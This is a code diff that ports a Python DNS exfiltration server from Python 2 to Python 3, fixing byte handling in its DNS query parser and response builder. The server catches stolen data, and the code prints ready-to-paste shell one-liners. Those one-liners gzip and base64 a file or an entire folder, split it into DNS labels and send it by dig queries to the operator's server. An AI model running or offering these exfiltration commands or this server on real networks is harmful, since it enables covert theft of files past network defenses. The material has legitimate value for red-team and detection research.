@@ -2,7 +2,6 @@
 
 import socket
 import sys
-import binascii
 import time
 import hashlib
 import zlib
@@ -23,29 +22,38 @@ class DNSQuery:
         self.data = data
         self.data_text = ''
 
-        tipo = (ord(data[2]) >> 3) & 15   # Opcode bits
+        # In Python 3, data[x] is already an integer. No need for ord()!
+        tipo = (data[2] >> 3) & 15   # Opcode bits
+        
         if tipo == 0:                     # Standard query
             ini = 12
-            lon = ord(data[ini])
+            lon = data[ini]               # No need for ord() here either
+        
         while lon != 0:
-            self.data_text += data[ini + 1:ini + lon + 1] + '.'
+            # decode the bytes to text (utf-8) for display
+            try:
+                part = data[ini + 1:ini + lon + 1].decode('utf-8')
+            except:
+                # If decoding fails, keep a raw representation
+                part = str(data[ini + 1:ini + lon + 1])
+            
+            self.data_text += part + '.'
             ini += lon + 1
-            lon = ord(data[ini])
+            lon = data[ini]               # No need for ord() here either
 
     def request(self, ip):
-        packet = ''
+        packet = b''
         if self.data_text:
-            packet += self.data[:2] + "\x81\x80"
+            packet += self.data[:2] + b"\x81\x80"
             packet += self.data[4:6] + self.data[4:6] + \
-                '\x00\x00\x00\x00'   # Questions and Answers Counts
+                b'\x00\x00\x00\x00'   # Questions and Answers Counts
             # Original Domain Name Question
             packet += self.data[12:]
             # Pointer to domain name
-            packet += '\xc0\x0c'
+            packet += b'\xc0\x0c'
             # Response type, ttl and resource data length -> 4 bytes
-            packet += '\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'
-            packet += str.join('', [chr(int(x))
-                               for x in ip.split('.')])  # 4bytes of IP
+            packet += b'\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'
+            packet += bytes([int(x) for x in ip.split('.')]) # 4bytes of IP
         return packet
 
 
@@ -121,7 +129,7 @@ def save_to_file(r_data, z, v):
                 hashlib.md5(
                 open(
                     fname,
-                    "r").read()).hexdigest()))
+                    "rb").read()).hexdigest()))
 
 
 def usage(str=""):
@@ -173,8 +181,9 @@ def p_cmds(s, b, ip, z):
 
     if (z):
         print("%s[?]%s Copy individual file (ZIP enabled)" % (c["y"], c["e"]))
+        # add +noidnin to dig ; refers to "man dig"
         print(
-            """\t%s\x23%s %sf=file.txt%s; s=%s;b=%s;c=0; for r in $(for i in $(gzip -c $f| base64 -w0 | sed "s/.\\{$b\\}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @%s `echo -ne $r$f|tr "+" "*"` +short; done """ %
+            """\t%s\x23%s %sf=file.txt%s; s=%s;b=%s;c=0; for r in $(for i in $(gzip -c $f| base64 -w0 | sed "s/.\\{$b\\}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @%s `echo -ne $r$f|tr "+" "*"` +short +noidnin; done """ %
             (c["r"],
              c["e"],
                 c["y"],
@@ -185,7 +194,7 @@ def p_cmds(s, b, ip, z):
         print()
         print("%s[?]%s Copy entire folder (ZIP enabled)" % (c["y"], c["e"]))
         print(
-            """\t%s\x23%s for f in $(ls .); do s=%s;b=%s;c=0; for r in $(for i in $(gzip -c $f| base64 -w0 | sed "s/.\\{$b\\}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @%s `echo -ne $r$f|tr "+" "*"` +short; done ; done""" %
+            """\t%s\x23%s for f in $(ls .); do s=%s;b=%s;c=0; for r in $(for i in $(gzip -c $f| base64 -w0 | sed "s/.\\{$b\\}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @%s `echo -ne $r$f|tr "+" "*"` +short +noidnin; done ; done""" %
             (c["r"],
              c["e"],
                 s,
@@ -195,7 +204,7 @@ def p_cmds(s, b, ip, z):
     else:
         print("%s[?]%s Copy individual file" % (c["y"], c["e"]))
         print(
-            """\t%s\x23%s %sf=file.txt%s; s=%s;b=%s;c=0; for r in $(for i in $(base64 -w0 $f| sed "s/.\\{$b\\}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @%s `echo -ne $r$f|tr "+" "*"` +short; done """ %
+            """\t%s\x23%s %sf=file.txt%s; s=%s;b=%s;c=0; for r in $(for i in $(base64 -w0 $f| sed "s/.\\{$b\\}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @%s `echo -ne $r$f|tr "+" "*"` +short +noidnin; done """ %
             (c["r"],
              c["e"],
                 c["y"],
@@ -206,7 +215,7 @@ def p_cmds(s, b, ip, z):
         print()
         print("%s[?]%s Copy entire folder" % (c["y"], c["e"]))
         print(
-            """\t%s\x23%s for f in $(ls .); do s=%s;b=%s;c=0; for r in $(for i in $(base64 -w0 $f | sed "s/.\\{$b\\}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @%s `echo -ne $r$f|tr "+" "*"` +short; done ; done""" %
+            """\t%s\x23%s for f in $(ls .); do s=%s;b=%s;c=0; for r in $(for i in $(base64 -w0 $f | sed "s/.\\{$b\\}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @%s `echo -ne $r$f|tr "+" "*"` +short +noidnin; done ; done""" %
             (c["r"],
              c["e"],
                 s,
